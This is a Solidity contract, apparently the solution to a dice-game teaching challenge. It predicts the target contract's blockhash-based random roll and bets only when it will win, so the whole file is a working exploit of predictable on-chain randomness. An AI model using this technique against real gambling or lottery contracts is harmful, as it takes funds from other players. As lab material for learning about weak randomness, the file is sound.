pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    receive() external payable {}

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool success, ) = _addr.call{value: _amount}("");
        require(success, "Failed while sending Eth");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public payable {
        require(msg.value >= 0.002 ether, "At least 0.002 ether is required.");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
        );
        uint256 roll = uint256(hash) % 16;

        if (roll > 2) {
            return;
        }

        diceGame.rollTheDice{value: msg.value}();
    }
}
